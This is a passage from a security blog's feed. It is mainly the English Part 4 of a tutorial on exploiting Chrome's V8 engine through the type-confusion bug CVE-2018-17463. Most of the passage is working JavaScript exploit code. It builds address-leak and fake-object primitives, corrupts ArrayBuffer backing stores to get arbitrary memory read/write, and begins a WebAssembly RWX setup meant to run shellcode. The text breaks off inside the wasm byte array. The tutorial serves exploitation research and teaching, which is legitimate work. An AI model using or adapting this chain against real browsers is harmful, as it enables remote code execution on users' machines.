&#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xADF8;&#xB7FC; &#xB610; &#xBD10;&#xC694; &#x1F64C;</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p><a href="https://v8.dev/blog/sandbox">https://v8.dev/blog/sandbox</a></p><p><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/</a></p><p><a href="https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf">https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf</a></p><p><a href="https://m.blog.naver.com/funraon/223669595583">https://m.blog.naver.com/funraon/223669595583</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2018-17463/">CVE-2018-17463</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-Sandbox/">Heap Sandbox</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 4.(EN)</title>
      <link>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/</guid>
      <pubDate>Fri, 10 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, OUYA77 here!&lt;/p&gt;
&lt;p&gt;Last time I failed to manage the post length and stopped after obtaining only the Read/Write primitives; this </description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, OUYA77 here!</p><p>Last time I failed to manage the post length and stopped after obtaining only the Read/Write primitives; this time I&#x2019;ll go all the way to RCE. So in this post I&#x2019;ll cover the remaining exploit details from CVE-2018-17463 and talk about the Heap Sandbox.</p><blockquote><p>See previous posts<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 2.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 3.</a></p></blockquote><h2 id="0-Recap"><a href="#0-Recap" class="headerlink" title="0. Recap"></a>0. Recap</h2><p>In Part 3 we used type confusion to find overlapping property pairs. Because an object pointer was interpreted as a double, by reading/writing the double field we were able to obtain Read/Write primitives from the pointer value being corrupted.</p><ul><li>The addrOf Read Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-comment">// 1. Dynamically create the vuln function (bypass Map checks)</span>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // We expect p1 to be a Double, but the actual loaded value is</span><span class="hljs-string">      // an Object pointer (p2)</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// target object whose address we want to know</span>    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (expected type)</span>    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (actual loaded value)</span>    <span class="hljs-comment">// 2. Trigger JIT optimization and induce Type Confusion</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-comment">// If the return value is not 13.37 (i.e., an address leaked), success</span>        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// return address with tag removed</span>        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><ul><li>The fakeObj Write Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res;        }    }}</code></pre><p>Now that we have a read primitive that can leak addresses and a write primitive that can write to object addresses, we&#x2019;ll refine these into arbitrary memory read/write (AAR/AAW) primitives for the exploit and drive toward RCE.</p><h1 id="1-CVE-2018-17463-cont&#x2019;d-For-RCE"><a href="#1-CVE-2018-17463-cont&#x2019;d-For-RCE" class="headerlink" title="1. CVE-2018-17463 (cont&#x2019;d) - For RCE"></a>1. CVE-2018-17463 (cont&#x2019;d) - For RCE</h1><h2 id="1-1-Relative-R-W-&#x2192;-AAR-W"><a href="#1-1-Relative-R-W-&#x2192;-AAR-W" class="headerlink" title="1.1 Relative R/W &#x2192; AAR/W"></a>1.1 Relative R/W &#x2192; AAR/W</h2><h3 id="Concept"><a href="#Concept" class="headerlink" title="Concept)"></a>Concept)</h3><p>The current read/write primitives let us overwrite property values(pointers) inside other JavaScript objects, but that alone isn&#x2019;t useful for reading/writing arbitrary memory addresses directly.</p><p>The problem stems from <strong>how V8 manages objects</strong>. Even if we overwrite a memory slot with a value that looks like an address (e.g., <code>0x41414141</code>), V8 will still treat that value as a <strong>valid JavaScript object pointer</strong>. So if we write the address where we want to put shellcode into an object pointer slot, V8 will dereference that pointer expecting a real object layout and then try to access its internal fields (for example, the <code>backing store</code> pointer at offset 8). Because the memory at that address likely does not contain the expected object layout, V8 will crash or the manipulation will fail.</p><p>To get true arbitrary-address read/write(AAR/AAW) we must overwrite an <strong>internal field that V8 actually uses as a raw memory pointer</strong>, not a JavaScript object pointer. A commonly used target is the <code>backing_store</code> pointer of an <code>ArrayBuffer</code>. An <code>ArrayBuffer</code> represents a fixed-length block of binary data; one of its internal fields is a pointer to the actual memory that stores the bytes &#x2014; the <code>backing_store</code>.</p><p>Because typed arrays (<code>TypedArray</code>, <code>DataView</code>, etc.) read and write through that <code>backing_store</code> pointer, controlling it effectively gives us control of what memory a typed-view reads/writes. Crucially, V8 treats the <code>backing_store</code> as a raw buffer address rather than validating it as a JavaScript object pointer, so overwriting it lets us point an <code>ArrayBuffer</code> at arbitrary memory.</p><p>Note: you cannot directly read/write data from an <code>ArrayBuffer</code> without a view &#x2014; you must access it via a <code>TypedArray</code> or <code>DataView</code> using the desired format (float, 64-bit integer, etc.). The exploitation flow becomes: use the limited Relative R/W primitive to overwrite an <code>ArrayBuffer</code>&#x2018;s <code>backing_store</code> pointer, then use a <code>TypedArray/DataView</code> on that buffer to read/write arbitrary memory.</p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation)"></a>Exploitation)</h3><p>Let&#x2019;s see how to implement that concept with the <code>fakeObj</code> primitive we already used.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj}    ...</code></pre><p>With <code>fakeObj</code> we can overwrite certain inline properties that overlap with other objects&#x2019; inline fields. In the <code>vuln</code> function we attempt to write <code>p1.x</code>, but due to type confusion that write actually targets <code>p2</code>&#x2018;s inline slot. That allows us to overwrite an object&#x2019;s stored pointer value.</p><p>The diagrams below illustrate the overlap. The <code>ArrayBuffer</code> backing_store pointer sits at offset 32, so if we create an object with two inline properties (e.g., <code>x1</code> and <code>x2</code>) where <code>x2</code> overlaps that backing_store slot, we can use the <code>fakeObj</code> write to target the backing_store pointer.</p><p><img src="image.png" alt="ref: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)"></p><p>ref: <a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p>ArrayBuffer backing_store is at offset 32; by adding another inline property <code>x2</code> we can reach and overwrite that pointer via our primitive.</p><p><img src="image%201.png" alt="image.png"></p><p>Using one overwritten ArrayBuffer is useful, but repeatedly triggering the bug to change the backing_store each time you want to read/write many addresses is tedious. A more practical trick uses <strong>two ArrayBuffers</strong>:</p><ol><li>Corrupt the backing_store pointer of the first ArrayBuffer so it points to the second ArrayBuffer object.</li><li>Use a <code>TypedArray</code> view on the first buffer to write into a specific property index which, because we pointed it at the second buffer, will overwrite the second buffer&#x2019;s backing_store pointer.</li><li>Now the second buffer&#x2019;s backing_store points at an attacker-controlled address. Using a <code>TypedArray</code> view on the second buffer lets you read/write that memory directly.</li></ol><p>This two-buffer technique lets you rapidly read/write arbitrary heap addresses without retriggering the vulnerability for every access. Diagram showing the two-buffer trick:</p><p><img src="image%202.png" alt="image.png"></p><h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding)"></a>Coding)</h3><p>We previously hard-coded the overwritten value. Now we make the primitive accept a parameter for the new value, and we change <code>p1</code> to have <strong>two inline properties</strong>, because the second inline property overlaps with the ArrayBuffer <code>backing_store</code>. So the <code>vuln</code> function must write to the second inline property to overwrite the backing_store pointer.</p><p>Also add a <code>toNumber</code> helper to convert <code>BigInt</code> addresses into the floating representation used in the type-confused slot (because our type confusion returns a float, we need to convert addresses into float bit patterns).</p><p>Final <code>fakeObj</code> primitive:</p><pre><code class="hljs jsx">BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Write to Backing Store Pointer via Property x2</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Force Map Check and Redundancy Elimination</span>        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>}</code></pre><p>We must also update the <code>addrOf</code> primitive in the same way (use <code>x2</code>):</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Trigger our type-confusion by accessing an out-of-bound property</span><span class="hljs-string">      // This will load p1 from our object thinking it&apos;s a Double, but instead</span><span class="hljs-string">      // due to overlap, it will load p2 which is an Object</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    pValues[p1] = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-comment">// Subtract 1n from address due to pointer tagging.</span>            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><hr><p>Now that the exploit script is modified, we should be able to overwrite an ArrayBuffer&#x2019;s backing_store pointer. Let&#x2019;s test it: create a new 1024-byte ArrayBuffer, leak its address, then overwrite its backing_store with <code>0x41414141</code> and verify using <code>%DebugPrint</code> that the backing_store changed.</p><p>Append to the script:</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffer</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf1fAddr = addrOf(arrBuf1);print(<span class="hljs-string">`[+] ArrayBuffer Address: 0x<span class="hljs-subst">${arrBuf1fAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store Address...&quot;</span>)<span class="hljs-comment">// Overwrite Backing Store Pointer with 0x41414141</span><span class="hljs-keyword">let</span> ret = fakeObj(arrBuf1, <span class="hljs-number">0x41414141n</span>);print(<span class="hljs-string">`[+] Original Leaked Data: 0x<span class="hljs-subst">${ret.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)</code></pre><p>Example output:</p><pre><code class="hljs prolog">[+] <span class="hljs-symbol">Finding</span> <span class="hljs-symbol">Overlapping</span> <span class="hljs-symbol">Properties</span>...[+] <span class="hljs-symbol">Properties</span> p15 and p11 overlap![+] <span class="hljs-symbol">Leaking</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>: <span class="hljs-number">0x2a164919360</span>...[+] <span class="hljs-symbol">Corrupting</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Backing</span> <span class="hljs-symbol">Store</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">Original</span> <span class="hljs-symbol">Leaked</span> <span class="hljs-symbol">Data</span>: <span class="hljs-number">0x1aeda203210</span><span class="hljs-symbol">DebugPrint</span>: ... - backing_store: <span class="hljs-number">0000000041414141</span>...</code></pre><hr><p>Now that we can overwrite backing_store, use two ArrayBuffers to build AAR/AAW primitives:</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    }};</code></pre><p>Summary: using type confusion we first obtained relative R/W via overlapping properties; by corrupting <code>ArrayBuffer</code> backing_store and employing two buffers we convert that into arbitrary-address R/W. </p><p>Now let&#x2019;s run the code and get code execution!</p><h2 id="1-2-AAR-W-&#x2192;-RCE"><a href="#1-2-AAR-W-&#x2192;-RCE" class="headerlink" title="1.2 AAR/W &#x2192; RCE"></a>1.2 AAR/W &#x2192; RCE</h2><h3 id="Toward-Gaining-Code-Execution"><a href="#Toward-Gaining-Code-Execution" class="headerlink" title="Toward Gaining Code Execution"></a>Toward Gaining Code Execution</h3><p>Now that we have AAR/W, we need to execute code &#x2014; but unfortunately we can&#x2019;t just write shellcode into the V8 heap or an ArrayBuffer and run it, because DEP(Data Execution Prevention) is enabled. A common alternative is to target JIT memory.</p><p>When JavaScript code is JIT-compiled, the compiler writes machine instructions into memory pages that must be executed, so those pages are typically given RWX(Read-Write-Execute) permissions. An attacker can leak a pointer to a JIT-compiled function, overwrite the code at that address with shellcode, and then call the function to run the shellcode.</p><p><em>However</em>, since 2018 the V8 team added <code>write_protect_code_memory</code>. That protection flips JIT pages to RX (Read-Execute) at execution time and to RW(Read-Write) only when writing, so it&#x2019;s no longer feasible to treat JIT memory as permanently RWX. As with pwnable challenges, one workaround is to build a ROP(Return-Oriented Programming) chain: manipulate vtables, JIT function pointers, or the stack to achieve code execution. ROP construction is fairly involved, though, so instead we&#x2019;ll use a simpler and more reliable approach: <strong>WebAssembly(wasm)</strong>.</p><h3 id="WebAssembly-basics"><a href="#WebAssembly-basics" class="headerlink" title="WebAssembly basics"></a>WebAssembly basics</h3><p>WebAssembly is a binary format designed to run low-level code in the browser (often compiled from C/C++), and it interoperates with JavaScript.</p><p>V8 does not fully optimize wasm code immediately; it first uses a baseline compiler called <strong>Liftoff</strong> to produce machine code. Wasm also uses JIT memory, so machine code is placed in executable pages. Importantly, because of asm.js compatibility reasons, the write-protect flag for wasm was (at the time) typically disabled, which made wasm a very useful exploitation primitive.</p><p>When a wasm module is instantiated in V8, function calls go through a <strong>jump table</strong>. Each function slot in that table points to the actual machine code for the function (a <code>WasmCode</code> object). Those pointers reference executable memory, so an attacker who can overwrite them could hijack execution. (Back in 2018 the wasm jump table in the V8 heap was readable/writable/executable and thus easy to hijack &#x2014; modern V8 has hardened this, though &#x315C;.&#x315C;.)</p><h3 id="addrOf-function-re-building"><a href="#addrOf-function-re-building" class="headerlink" title="addrOf function re-building"></a>addrOf function re-building</h3><p>Using our read/write primitives we can leak the wasm instance object address and the RWX jump table pointer. However, the earlier <code>addrOf</code> primitive relied on overlapping properties (which can corrupt other functionality), so we need a safer approach.</p><p>We will build a new <code>addrOf</code> by adding an <strong>out-of-line property</strong> to an <code>ArrayBuffer</code>, referencing the target object there, and then reading the property storage metadata via our memory read primitive to leak the object pointer. This avoids overwriting inline object fields.</p><blockquote><p><strong>Why this works</strong>_<br><strong>**An <code>ArrayBuffer</code> manages raw bytes and, separately from inline properties, it has a </strong>property storage**(property backing store). If we assign an object to an out-of-line property (e.g., <code>arrBuf.leakMe = obj</code>), a pointer to the object is placed in that property storage. By using our arbitrary memory read primitive to inspect that property store&#x2019;s metadata, we can indirectly obtain the object pointer. In other words, we can leak an object&#x2019;s address without overwriting its fields.</p></blockquote><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {  addrOf(obj) {    <span class="hljs-comment">// Set object address to new out-of-line property called leakme</span>    arrBuf2.leakMe = obj;    <span class="hljs-comment">// Use read64 primitive to leak the properties backing store address of our array buffer</span>    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-comment">// Read offset 16 from the array buffer backing store and return the address of our object</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};</code></pre><p>Using this technique we can finally leak the <code>wasmInstance</code> address and the RWX jump table pointer for that instance.</p><h2 id="1-3-RCE-PoC"><a href="#1-3-RCE-PoC" class="headerlink" title="1.3. RCE PoC"></a>1.3. RCE PoC</h2><p>Now let&#x2019;s combine everything we&#x2019;ve covered so far.</p><h3 id="1-Build-primitives"><a href="#1-Build-primitives" class="headerlink" title="[1] Build primitives"></a>[1] Build primitives</h3><p>Find the address of the second <code>ArrayBuffer</code> with <code>addrOf</code>, change the <code>backing_store</code> pointer of the first buffer to point to the second buffer&#x2019;s address, and then build memory read/write primitives from that.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>)<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1)<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>]<span class="hljs-comment">// Construct Memory Primitives via Array Buffers</span><span class="hljs-keyword">let</span> memory = {  write(addr, bytes) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);    view2.set(bytes);  },  read64(addr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];  },  write64(addr, ptr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    view2[<span class="hljs-number">0</span>] = ptr;  },  addrOf(obj) {    arrBuf2.leakMe = obj;    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);</code></pre><h3 id="2-Create-a-WebAssembly-instance"><a href="#2-Create-a-WebAssembly-instance" class="headerlink" title="[2] Create a WebAssembly instance"></a>[2] Create a WebAssembly instance</h3><p>This wasm code block compiles a simple &#x201C;dummy function&#x201D; into JIT memory. When the instance is created, an internal <strong>RWX jump table</strong> is allocated. We can later overwrite that RWX memory with shellcode and execute it.</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-comment">// Generate RWX region for Shellcode via WASM</span><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span 